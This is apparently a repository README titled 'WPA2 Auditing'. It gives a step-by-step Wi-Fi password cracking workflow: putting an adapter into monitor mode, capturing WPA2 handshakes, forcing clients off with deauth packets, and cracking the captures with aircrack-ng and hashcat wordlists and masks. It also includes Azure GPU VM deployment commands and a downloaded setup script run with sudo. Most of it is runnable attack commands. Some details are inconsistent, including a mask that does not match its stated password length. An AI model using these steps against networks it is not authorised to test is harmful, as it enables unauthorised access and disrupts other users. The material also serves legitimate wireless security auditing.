# WPA2 Auditing

This is a template for setting up and deploying [hashcat](https://hashcat.net/) and [John the Ripper](https://www.openwall.com/john/) on Azure using NV-series virtual machines and GRID drivers. Click above button to deploy on [Microsoft Azure](https://azure.microsoft.com/) (requires an Azure subscription).


1. WPA2 Hacking Techniques
   - Cracking hashes extracted from WIFI traffic
     - 4-way Handshake - good old way of getting the info, but need to be pation or injects packets in the network to deauth existing hosts
	 - PMKID - easy to grab the hash from the air, but not all APs are advertasing it
   - WPS vulnerability - practically instinct

## Tooling

Here is some manual for most common tooling

## Airmon-ng

Old way good way is trusty **airmon-ng**, which can be found in any Kali. Advantage is you can see what is happening, but it requires more work.

First kill or processes which could tamper with monitoring device
```
sudo airmon-ng check kill
```

Put the wireless network device into monitor mode
```
sudo airmon-ng start wlan0
```

Listen for all nearby beacon frames to get a good ovewview of available BSSIDs and channels. You want to have good signal to have succesfull interactions with the AP. I wouldn't go lower than -60dB
```
sudo airodump-ng wlan0mon

68:8F:2E:xx:xx:xx  -47  24      141     3076   34   6  195   WPA2 CCMP   PSK  Wifi1   
F0:F2:49:xx:xx:xx  -82   1        0       30    0   1  195   WPA2 CCMP   PSK  Wifi2     
D4:B9:2F:xx:xx:xx  -69  74      245        0    0  11  130   WPA2 CCMP   PSK  WifiX
```

Start listening for handshake from picked BSSID (Wifi1), save the result into wifi folder
```
sudo airodump-ng -c 11 --bssid 68:8F:2E:xx:xx:xx -w wifi/ wlan0mon
```

If you are brave enough, you can deauth a connected client to force a handshake
```
sudo aireplay-ng -0 2 -a 68:8F:2E:xx:xx:xx -c 64:BC:0C:xx:xx:xx wlan0mon
```

Last step is to crack it with aircrack-ng using rockyou.txt
```
aircrack-ng -a2 -b 68:8F:2E:xx:xx:xx -w rockyou.txt wifi/-01.cap
```

Or even better use **hashcat** - faster, utilizes GPU, more configurable

First convert cap to hccapx format
```
./cap2hccapx -01.cap Wifi1.hccapx
```
Grab the cap2hccapx from https://github.com/hashcat/hashcat-utils

And let hashcat do the job cracking for you.
```
hashcat -w 3 -m 2500 Wifi.hccapx -o cracked.txt rockyou.txt -O
```

If you need to do hard bruteforce, hashcat can help as well. This is for 8 char password, which consist just form numbers
```
hashcat -w 3 -m 2500 -a 3 -o cracked.txt Wifi.hccapx ?d?d?d?d?d?d?d?d?d?d
```

We can specify how the password looks like if we have some clues - this is for [A-Za-z][a-z]{3}[12][0-9]{3}
```
hashcat  -w 3 -m 2500 -1 ?u?l -2 12 -a 3  -o results.txt numbers_crack.hccapx ?1?l?l?l?2?d?d?d
```

## Azure Hashing Power

The deployment will create an Ubuntu Server 18.10 LTS instance on an Azure NV-series virtual machine. You need to fill in your details in the paramters file to reflect your AZ subscription.

Than run this command in Cloudshell of yours AZ Subscribtion
```
az deployment group create --resource-group hash_east --template-uri https://raw.githubusercontent.com/tomas-kabrt/PenTest/Master/vm_template.json --parameters https://raw.githubusercontent.com/tomas-kabrt/SOC/master/nc12.parameters.json 
```

Let's connect to the machine using putty or ssh and download and install grid drivers and hashcat
```
wget azure_hashcat_preparation.sh
chmod +x azure_hashcat_preparation.sh
sudo ./azure_hashcat_preparation.sh
```

Now you are ready for cracking. I am recommending to make session persistent (screen), so it contiue crunching even when you are disconnected
```
screen
hashcat  -w 3 --force -m 16800 -a 3 a.16800 ?H?H?H?H?H?H?H?H
```